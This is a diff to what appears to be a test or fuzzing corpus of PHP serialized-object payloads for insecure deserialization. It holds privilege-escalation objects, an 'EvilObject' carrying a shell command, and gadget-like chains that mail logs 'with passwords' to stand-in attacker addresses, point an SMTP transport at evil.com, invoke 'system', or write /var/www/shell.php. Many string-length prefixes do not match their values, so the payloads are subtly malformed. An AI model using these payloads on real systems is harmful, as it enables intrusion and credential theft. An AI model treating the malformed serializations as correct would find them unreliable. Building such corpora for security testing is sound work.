@@ -1,6 +1,6 @@
 O:8:"stdClass":0:{}
 a:2:{s:4:"test";s:4:"test";s:4:"test2";R:2;}
-rO0ABXNyADJvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGlNZWRBcFNlbnRyeQCO0d0bRf5zAgADTAADa2V5dAASTGphdmEvbGFuZy9PYmplY3Q7TAALbWFwT3JkZXJ0ABJMamF2YS91dGlsL09iamVjdDtbAAZtYXBzWwALTGphdmEvdXRpbC9NYXA7eHBwdAABWnIAAAAA
+O:10:"EvilObject":1:{s:3:"cmd";s:2:"id";}
 O:10:"UserObject":4:{s:8:"username";s:5:"admin";s:8:"password";s:8:"password";s:7:"is_admin";b:1;s:4:"role";s:5:"admin";}
 O:14:"PDOException":2:{s:10:"\x00*\x00message";s:5:"error";s:7:"\x00*\x00code";i:0;}
 O:9:"Exception":2:{s:7:"exception";O:9:"Exception":2:{s:7:"exception";s:4:"test";}}}
@@ -12,14 +12,14 @@ O:9:"PHPObject":1:{s:4:"data";s:5:"alert";}
 O:8:"stdClass":2:{s:5:"name";s:4:"test";s:3:"age";i:25;}
 O:6:"Config":1:{s:14:"\x00*\x00dbPassword";s:8:"password";}
 O:6:"Config":1:{s:14:"\x00*\x00dbHost";s:9:"localhost";}
-O:6:"Config":1:{s:14:"\x00*\x00apiKey";s:32:"sk-abcdefghijklmnopqrstuvwxyz1234";}
+O:6:"Config":1:{s:14:"\x00*\x00apiKey";s:10:"fake-key!";}
 O:8:"stdClass":2:{s:4:"user";O:8:"stdClass":1:{s:8:"password";s:8:"hacked";};s:8:"is_admin";b:1;}
 a:1:{i:0;s:4:"test";}
 a:1:{i:0;O:8:"stdClass":0:{}}
 O:10:"AppSession":1:{s:4:"user";s:5:"admin";}
 O:7:"Session":2:{s:4:"user";s:5:"admin";s:4:"role";s:5:"admin";}
 O:17:"Illuminate\Support\Facades\Log":1:{s:5:"level";s:3:"debug";}
-O:12:"Monolog\Logger":3:{s:5:"name";s:7:"app";s:7:"handlers";a:1:{i:0;O:16:"Monolog\Handler\FingersCrossedHandler":2:{s:7:"handler";O:16:"Monolog\Handler\TestHandler":0:{};s:8:"test";O:16:"Monolog\Handler\NativeMailerHandler":3:{s:3:"to";a:1:{i:0;s:14:"attacker@evil.com";}s:5:"from";s:14:"victim@target.com";s:7:"subject";s:22:"Log file with passwords";}}}}
+O:12:"Monolog\Logger":3:{s:5:"name";s:7:"app";s:7:"handlers";a:1:{i:0;O:16:"Monolog\Handler\FingersCrossedHandler":2:{s:7:"handler";O:16:"Monolog\Handler\TestHandler":0:{};s:8:"test";O:16:"Monolog\Handler\NativeMailerHandler":3:{s:3:"to";a:1:{i:0;s:14:"attacker@example.com";}s:5:"from";s:14:"victim@target.com";s:7:"subject";s:22:"Log file with passwords";}}}}
 O:9:"Swift_Mailer":1:{s:6:"_transport";O:26:"Swift_SmtpTransport":3:{s:6:"_host";s:9:"evil.com";s:6:"_port";i:25;s:8:"_encryption";N;}}
 O:14:"PHPUnit_Util_Log":1:{s:7:"_files";a:1:{i:0;s:4:"/tmp";}}
 O:17:"GuzzleHttp\HandlerStack":1:{s:7:"handler";s:6:"system";}
@@ -29,7 +29,7 @@ O:24:"Doctrine\Common\Cache\ApcuCache":0:{}
 O:25:"Doctrine\Common\Cache\FileCache":4:{s:11:"\x00*\x00directory";s:4:"/tmp";s:8:"\x00*\x00extension";s:4:".php";s:6:"\x00*\x00umask";i:0;s:5:"\x00*\x00id";s:4:"test";}
 O:13:"Zend\Log\Logger":2:{s:8:"\x00*\x00writers";a:1:{i:0;s:4:"test";}}
 O:28:"Zend\Log\Writer\FirePhp":1:{s:8:"\x00*\x00events";a:1:{i:0;s:4:"test";}}
-O:28:"Zend\Log\Writer\Mail":2:{s:8:"\x00*\x00events";a:1:{i:0;s:4:"test";};s:6:"\x00*\x00mail";O:9:"Zend\Mail\Mail":1:{s:8:"\x00*\x00to";a:1:{i:0;s:14:"attacker@evil.com";}}}
+O:28:"Zend\Log\Writer\Mail":2:{s:8:"\x00*\x00events";a:1:{i:0;s:4:"test";};s:6:"\x00*\x00mail";O:9:"Zend\Mail\Mail":1:{s:8:"\x00*\x00to";a:1:{i:0;s:14:"attacker@example.com";}}}
 O:29:"Zend\Log\Writer\Stream":1:{s:8:"\x00*\x00streamUrl";s:28:"php://filter/write=resource=/tmp/test";}
 O:31:"Zend\Log\Writer\Db":2:{s:8:"\x00*\x00db";O:9:"PDO":0:{};s:8:"\x00*\x00table";s:5:"users";}
 O:12:"Phpsec\Util\FileWriter":1:{s:4:"path";s:15:"/var/www/shell.php";}
